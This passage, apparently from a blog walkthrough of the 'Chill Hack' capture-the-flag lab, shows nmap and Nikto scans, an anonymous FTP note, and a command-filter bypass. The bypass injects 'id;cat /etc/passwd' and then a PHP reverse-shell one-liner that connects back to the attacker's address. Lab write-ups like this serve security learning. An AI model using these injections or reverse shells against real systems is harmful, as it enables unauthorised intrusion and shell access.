+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+<ul>
+<li><a href="/blog/chillhack/#table-of-contents">Table of contents</a></li>
+<li><a href="/blog/chillhack/#-enumeration">🔎 Enumeration</a>
+<ul>
+<li><a href="/blog/chillhack/#port-scan">Port scan</a></li>
+<li><a href="/blog/chillhack/#reading-public-available-ftp">Reading public available FTP</a></li>
+<li><a href="/blog/chillhack/#web-discovery">Web discovery</a>
+<ul>
+<li><a href="/blog/chillhack/#nikto">Nikto</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="/blog/chillhack/#-foothold">🚪🚶 Foothold</a>
+<ul>
+<li><a href="/blog/chillhack/#becoming-apaar">Becoming &ldquo;apaar&rdquo;</a></li>
+<li><a href="/blog/chillhack/#reverse-ssh-tunnel">Reverse SSH Tunnel</a></li>
+<li><a href="/blog/chillhack/#web-discovery-1">Web discovery</a>
+<ul>
+<li><a href="/blog/chillhack/#nikto-1">Nikto</a></li>
+<li><a href="/blog/chillhack/#ffuf">ffuf</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="/blog/chillhack/#️-privilege-escalation">🛡️ Privilege Escalation</a></li>
+<li><a href="/blog/chillhack/#-complete">🍻 Complete</a></li>
+</ul>
+
+<h1 id="-enumeration" class="heading">🔎 Enumeration <a href="#-enumeration" aria-labelledby="-enumeration">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_2097,w_2800/v1608376754/blog/image-20201218145037088_ktcvcv.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_431,w_576/v1608376754/blog/image-20201218145037088_ktcvcv.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_575,w_768/v1608376754/blog/image-20201218145037088_ktcvcv.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_743,w_992/v1608376754/blog/image-20201218145037088_ktcvcv.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_899,w_1200/v1608376754/blog/image-20201218145037088_ktcvcv.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1049,w_1400/v1608376754/blog/image-20201218145037088_ktcvcv.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_2097,w_2800/v1608376754/blog/image-20201218145037088_ktcvcv.png 2800w" sizes="100vw"
+            height="2097"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+<h2 id="port-scan" class="heading">Port scan <a href="#port-scan" aria-labelledby="port-scan">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@jiban:/home/tiago# nmap -sT -p- 192.168.0.69
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 15:20 -03
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.0.69
+</span></span><span class="line"><span class="cl">Host is up (0.0072s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65532 closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp open  ftp
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:AE:7E:F9 (VMware)</span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@jiban:/home/tiago# nmap -sT -p- 192.168.0.69
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 15:20 -03
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.0.69
+</span></span><span class="line"><span class="cl">Host is up (0.0072s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65532 closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp open  ftp
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:AE:7E:F9 (VMware)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds
+</span></span><span class="line"><span class="cl">root@jiban:/home/tiago# nmap -sV -A -O 192.168.0.69
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 15:20 -03
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.0.69
+</span></span><span class="line"><span class="cl">Host is up (0.0013s latency).
+</span></span><span class="line"><span class="cl">Not shown: 997 closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span class="line"><span class="cl">|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
+</span></span><span class="line"><span class="cl">| ftp-syst: 
+</span></span><span class="line"><span class="cl">|   STAT: 
+</span></span><span class="line"><span class="cl">| FTP server status:
+</span></span><span class="line"><span class="cl">|      Connected to ::ffff:192.168.0.24
+</span></span><span class="line"><span class="cl">|      Logged in as ftp
+</span></span><span class="line"><span class="cl">|      TYPE: ASCII
+</span></span><span class="line"><span class="cl">|      No session bandwidth limit
+</span></span><span class="line"><span class="cl">|      Session timeout in seconds is 300
+</span></span><span class="line"><span class="cl">|      Control connection is plain text
+</span></span><span class="line"><span class="cl">|      Data connections will be plain text
+</span></span><span class="line"><span class="cl">|      At session startup, client count was 4
+</span></span><span class="line"><span class="cl">|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl">|_End of status
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
+</span></span><span class="line"><span class="cl">|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Game Info
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:AE:7E:F9 (VMware)
+</span></span><span class="line"><span class="cl">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
+</span></span><span class="line"><span class="cl">OS:SCAN(V=7.80%E=4%D=12/18%OT=21%CT=1%CU=40368%PV=Y%DS=1%DC=D%G=Y%M=000C29%
+</span></span><span class="line"><span class="cl">OS:TM=5FDCF313%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=
+</span></span><span class="line"><span class="cl">OS:I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%
+</span></span><span class="line"><span class="cl">OS:O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W
+</span></span><span class="line"><span class="cl">OS:6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
+</span></span><span class="line"><span class="cl">OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
+</span></span><span class="line"><span class="cl">OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
+</span></span><span class="line"><span class="cl">OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
+</span></span><span class="line"><span class="cl">OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
+</span></span><span class="line"><span class="cl">OS:=N%T=40%CD=S)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Network Distance: 1 hop
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TRACEROUTE
+</span></span><span class="line"><span class="cl">HOP RTT     ADDRESS
+</span></span><span class="line"><span class="cl">1   1.30 ms 192.168.0.69
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 19.58 seconds</span></span></code></pre></div></div>
+<h2 id="reading-public-available-ftp" class="heading">Reading public available FTP <a href="#reading-public-available-ftp" aria-labelledby="reading-public-available-ftp">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@jiban:/home/tiago# lftp 192.168.0.69
+</span></span><span class="line"><span class="cl">lftp 192.168.0.69:~&gt; ls
+</span></span><span class="line"><span class="cl">-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
+</span></span><span class="line"><span class="cl">lftp 192.168.0.69:/&gt; cat note.txt 
+</span></span><span class="line"><span class="cl">Anurodh told me that there is some filtering on strings being put in the command -- Apaar
+</span></span><span class="line"><span class="cl">90 bytes transferred
+</span></span><span class="line"><span class="cl">lftp 192.168.0.69:/&gt; </span></span></code></pre></div></div>
+<h2 id="web-discovery" class="heading">Web discovery <a href="#web-discovery" aria-labelledby="web-discovery">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+<p><img src="https://i.imgur.com/ZEkZSri.jpg"></p>
+
+<h3 id="nikto" class="heading">Nikto <a href="#nikto" aria-labelledby="nikto">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h3>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># nikto -h 192.168.0.69
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          192.168.0.69
+</span></span><span class="line"><span class="cl">+ Target Hostname:    192.168.0.69
+</span></span><span class="line"><span class="cl">+ Target Port:        80
+</span></span><span class="line"><span class="cl">+ Start Time:         2020-12-18 15:25:09 (GMT-3)
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.29 (Ubuntu)
+</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+</span></span><span class="line"><span class="cl">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
+</span></span><span class="line"><span class="cl">+ IP address found in the &#39;location&#39; header. The IP is &#34;127.0.1.1&#34;.
+</span></span><span class="line"><span class="cl">+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &#34;127.0.1.1&#34;.
+</span></span><span class="line"><span class="cl">+ Server may leak inodes via ETags, header found with file /, inode: 8970, size: 56d7e303a7e80, mtime: gzip
+</span></span><span class="line"><span class="cl">+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+</span></span><span class="line"><span class="cl">+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /css/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /css/: This might be interesting...
+</span></span><span class="line"><span class="cl">+ OSVDB-3092: /secret/: This might be interesting...
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /images/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3233: /icons/README: Apache default file found.
+</span></span><span class="line"><span class="cl">+ 7915 requests: 0 error(s) and 13 item(s) reported on remote host
+</span></span><span class="line"><span class="cl">+ End Time:           2020-12-18 15:26:17 (GMT-3) (68 seconds)</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1067,w_2800/v1608376754/blog/image-20201218152706896_bubr3y.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_220,w_576/v1608376754/blog/image-20201218152706896_bubr3y.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_293,w_768/v1608376754/blog/image-20201218152706896_bubr3y.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_378,w_992/v1608376754/blog/image-20201218152706896_bubr3y.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_457,w_1200/v1608376754/blog/image-20201218152706896_bubr3y.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_534,w_1400/v1608376754/blog/image-20201218152706896_bubr3y.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1067,w_2800/v1608376754/blog/image-20201218152706896_bubr3y.png 2800w" sizes="100vw"
+            height="1067"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+<h1 id="-foothold" class="heading">🚪🚶 Foothold <a href="#-foothold" aria-labelledby="-foothold">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1499,w_2800/v1608376754/blog/image-20201218153009366_otftaq.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_308,w_576/v1608376754/blog/image-20201218153009366_otftaq.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_411,w_768/v1608376754/blog/image-20201218153009366_otftaq.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_531,w_992/v1608376754/blog/image-20201218153009366_otftaq.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_643,w_1200/v1608376754/blog/image-20201218153009366_otftaq.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_750,w_1400/v1608376754/blog/image-20201218153009366_otftaq.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1499,w_2800/v1608376754/blog/image-20201218153009366_otftaq.png 2800w" sizes="100vw"
+            height="1499"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p>Although the filter, it was easy to bypass.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id;cat /etc/passwd</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1868,w_2800/v1608376755/blog/image-20201218154202722_zs9bht.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_384,w_576/v1608376755/blog/image-20201218154202722_zs9bht.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_512,w_768/v1608376755/blog/image-20201218154202722_zs9bht.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_662,w_992/v1608376755/blog/image-20201218154202722_zs9bht.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_801,w_1200/v1608376755/blog/image-20201218154202722_zs9bht.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_934,w_1400/v1608376755/blog/image-20201218154202722_zs9bht.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1868,w_2800/v1608376755/blog/image-20201218154202722_zs9bht.png 2800w" sizes="100vw"
+            height="1868"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">id<span class="p">;</span>php -r <span class="s1">&#39;$sock=fsockopen(&#34;192.168.0.64&#34;,1234);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</span></span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_526,w_2800/v1608376754/blog/image-20201218155023604_my35bp.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_108,w_576/v1608376754/blog/image-20201218155023604_my35bp.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_144,w_768/v1608376754/blog/image-20201218155023604_my35bp.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_186,w_992/v1608376754/blog/image-20201218155023604_my35bp.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_225,w_1200/v1608376754/blog/image-20201218155023604_my35bp.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_263,w_1400/v1608376754/blog/image-20201218155023604_my35bp.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_526,w_2800/v1608376754/blog/image-20201218155023604_my35bp.png 2800w" sizes="100vw"
+            height="526"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p>Spawning a better shell</p>
